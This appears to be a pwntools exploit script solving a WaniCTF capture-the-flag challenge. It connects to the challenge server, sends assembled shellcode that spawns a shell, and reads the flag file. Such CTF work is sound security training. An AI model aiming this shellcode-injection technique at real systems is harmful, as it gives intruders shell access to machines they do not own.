from pwn import *

context(arch='amd64')
# p = process('./chall')
p = remote('ret2win-pwn.wanictf.org', 9004)

payload = asm(shellcraft.sh())
p.sendline(payload)
p.sendline(b'cat FLAG')

p.interactive()
